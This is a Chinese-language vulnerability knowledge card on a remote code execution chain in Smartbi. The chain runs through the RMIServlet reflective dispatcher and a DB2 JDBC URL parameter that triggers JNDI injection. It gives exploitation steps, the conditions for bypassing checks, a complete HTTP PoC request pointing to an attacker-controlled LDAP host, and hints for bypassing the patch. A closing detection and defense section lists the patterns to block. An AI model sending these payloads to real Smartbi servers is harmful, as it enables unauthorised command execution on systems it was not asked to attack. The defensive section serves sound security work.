---
id: web-java-component-smartbi-rmiservlet-db2-jdbc-jndi-rce
title: Smartbi RMIServlet 反射调用 DataSourceService：DB2 JDBC clientRerouteServerListJNDIName 触发 JNDI RCE
type: scenario
domain: web
path: web/java/component
technique: smartbi-rmiservlet-db2-jdbc-jndi-rce
aliases:
- Smartbi DB2 命令执行
- Smartbi RMIServlet RCE
- clientRerouteServerListJNDIName
- testConnection JNDI
- Smartbi 数据源 JNDI
tags:
- smartbi
- java
- rmi-servlet
- reflection
- jdbc
- db2
- jndi
- datasource
- rce
cve: []
severity: critical
confidence: medium
status: verified
affected_versions: Smartbi V10（10.5.8）与 V11（原文测试 V11-20250507、V11-20260303）；DB2 clientRerouteServerListJNDIName 在后续补丁中被拦截，simpleTestConnection 于 Patch.20250327 修复
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V36
  verified_at: '2026-11-05T06:08:54+08:00'
  notes: 已对照原文与61张图核对：RMIServlet 反射分发、DataSourceService.testConnection→DataSourceHandleHelper#testConnection、DB2 clientRerouteServerListJNDIName、validationQueryMethod=3/kerberosLogin/password 等绕过点、补丁拦截与 simpleTestConnection 修复均与卡片一致。未验证点：原文“成功触发”截图为外部 CDN 图不在本地；V11 需会话/补丁前绕过，卡片 confidence=medium 合理；未本机复现。
---

## 一句话结论

Smartbi 的 `/smartbi/vision/RMIServlet` 按请求中的 `className`/`methodName`/`params` 反射调用后端 Service；当攻击者调用 `DataSourceService.testConnection` 并传入可控数据源参数时，DB2 JDBC URL 中的 `clientRerouteServerListJNDIName` 会被 DB2 驱动当作 JNDI 名称解析，指向攻击者控制的 LDAP/RMI 服务即可触发 JNDI 注入并执行任意代码。

## 原理

- **反射分发入口**：`RMIServlet` 解析 `RMIInfo`（`className`、`methodName`、`params`），从 `RMIModule` 取出对应 `ClientService` 并以反射方式调用方法。`className` 只需是已注册 Service，`methodName` 与参数由请求控制。
- **可控数据源参数**：`DataSourceService.testConnection` 接收一个数据源配置对象（JSON），包含 `url`、`driver`、`validationQuery`、`validationQueryMethod`、`password` 等。服务端用 Jackson 把 JSON 映射为代理对象，再进入 `DataSourceHandleHelper#testConnection` 建立 JDBC 连接。
- **DB2 驱动的 JNDI 特性**：DB2 JDBC URL 支持 `clientRerouteServerListJNDIName=ldap://host:port/name` 参数，驱动会按该 JNDI 名称做 lookup。攻击者把该参数指向恶意 LDAP/RMI 服务，由服务端反序列化/远程加载攻击者提供的对象（如 java-chains 生成的 gadget），即可在 Smartbi 进程内执行命令。
- **绕过链路上的检查**：
  - 第一个 `has` 检查会拦截 URL 中的 `clientRerouteServerListJNDIName`，这是新版本的防护点；旧版本或未打补丁时不存在该检查。
  - 第二个 `has` 限制文件型 HSQL、`validationQuery` 中的分号且通常要求以 `select` 开头。
  - `kerberosLogin` 属性不设置即可跳过 Kerberos 分支。
  - `validationQueryMethod` 设为 `3` 可跳过中间的校验分支，直接走到 `getConnectionBeyondPool` 触发 JDBC 连接。
  - `password` 需要有值，才能通过空值判断进入连接逻辑；其余被 get 的属性最好都赋值，避免代理对象取值时空指针。
- **危害**：JDBC 连接发生在 Smartbi 服务端，JNDI 注入成功后代码以 Smartbi 进程权限执行，属于完整 RCE 链。

## 触发条件

- 目标暴露 `/smartbi/vision/RMIServlet`，且版本/补丁未拦截 `clientRerouteServerListJNDIName`。
- 攻击者能访问该接口；V11 默认需要有效会话（原文提到 patch<20250731 可经 share.jsp 获取 cookie，但未展开），V10 或未鉴权配置可直接调用。
- 攻击者可控 `className=DataSourceService`、`methodName=testConnection`（或 `testConnectionList`）及 `params`。
- 攻击者拥有可被目标访问的 LDAP/RMI 服务与可用 gadget（如 java-chains 生成的利用链）。
- 目标 DB2 驱动版本支持 `clientRerouteServerListJNDIName`（DB2 JDBC 驱动常见能力）。

## 利用步骤

1. 确认 `/smartbi/vision/RMIServlet` 可访问，并获取有效会话（如需）。
2. 准备恶意 LDAP/RMI 服务，生成能触发命令执行的 JNDI 利用链，监听如 `ldap://attacker:50389/xxx`。
3. 构造数据源 JSON：`driver=com.ibm.db2.jcc.DB2Driver`、`url=jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://attacker:50389/xxx;`，并补齐 `name`、`validationQuery`、`maxConnection`、`transactionIsolation`、`validationQueryMethod=3`、`authenticationType`、`driverCatalog`、`password` 等字段。
4. 向 `/smartbi/vision/RMIServlet` 发送 `className=DataSourceService&methodName=testConnection&params=[<数据源 JSON>]`。
5. 观察恶意 LDAP/RMI 服务是否收到连接、目标是否执行命令；必要时改用 `testConnectionList`（`params` 外层再套一层数组）。
6. 打补丁后 `clientRerouteServerListJNDIName` 会被拦截，可结合其它未列入黑名单的 JDBC 方法或参数（如同类 `simpleTestConnection` 的 `serverName`/`dbName` 拼接）继续测试。

## PoC

```http
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: target
Cookie: JSESSIONID=<有效会话>
Content-Type: application/x-www-form-urlencoded

className=DataSourceService&methodName=testConnection&params=[{"url":"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://attacker:50389/4c94ba;","name":"test","driverType":"DB2","validationQuery":"select","driver":"com.ibm.db2.jcc.DB2Driver","maxConnection":"100","transactionIsolation":"1","validationQueryMethod":"3","authenticationType":"test","driverCatalog":"test","password":"x"}]
```

`testConnectionList` 变体只需把 `methodName` 改为 `testConnectionList`，并把 `params` 再包一层数组：

```text
methodName=testConnectionList&params=[[{...同一个数据源 JSON...}]]
```

原文在调试时先把 `clientRerouteServerListJNDIName` 去掉一个字母以通过拦截，再在断点中改回，用于本地验证补丁后的触发路径；真实目标需在未打补丁版本上直接发送完整参数。

## 变体与关联

- 变体（同类方法）：`testConnectionList` 批量测试入口，参数结构不同但 sink 相同。
- 变体（黑名单绕过）：`DataSourceService.simpleTestConnection` 通过 `serverName`/`dbName` 拼接 JDBC URL，原文只做了代码分析并给出修复（Patch.20250327），未给出完整可执行 PoC。
- 变体（其他驱动）：HSQL、MySQL、PostgreSQL、Kingbase8 等 JDBC 驱动的 URL 参数也可能触发 JNDI/文件/脚本执行，需按驱动特性测试。
- 关联：[[web-java-component-smartbi-rmiservlet-stub-jsonpcallback-get-post-bypass]]（绕过仅拦 POST 的补丁，投递同一 DB2 sink）。
- 关联：[[web-java-component-smartbi-v10-windowunloading-auth-parse-split-bypass]]（V10 无会话调用 RMIServlet 的鉴权绕过）。
- 关联：[[web-java-component-h2-jdbc-url-filter-bypass-runscript]]、[[web-java-component-dataease-json-driver-override-jdbc-rce]]、[[web-java-component-finereport-reportserver-hsql-param-rce]]（同类“可控 JDBC URL/驱动参数 → RCE”模式）。
- 边界：新版本在源码/补丁中拦截 `clientRerouteServerListJNDIName`；目标出网受限无法访问攻击者 LDAP/RMI 时链不成立；JNDI 利用还受 JDK 版本与反序列化过滤影响。

## 检测与防御

- 升级/打补丁：应用官方安全补丁，确认补丁列表包含对 DB2 绕过与 `simpleTestConnection` 的修复；不要只依赖单条 URL 关键字黑名单。
- 输入校验：数据源 `url`、`driver`、`serverName`、`dbName` 使用白名单；拒绝 `clientReroute*`、`jndi:`、`ldap:`、`rmi:` 等危险参数；禁止用户自定义 JDBC 驱动类。
- 网络隔离：Smartbi 服务器限制出站 LDAP/RMI/任意端口，阻断 JNDI 回连；数据库连接只允许访问受控网段。
- 鉴权：`/smartbi/vision/RMIServlet` 强制登录与细粒度权限，禁止匿名调用 Service；对 `className`/`methodName` 做白名单。
- 检测：RMIServlet 请求中出现 `clientRerouteServerListJNDIName`、`ldap://`、`rmi://`、`jndi:`；数据源测试接口出现非常规 `driver`/`url`；Smartbi 进程异常外连 LDAP/RMI 端口；JNDI lookup 与反序列化告警。
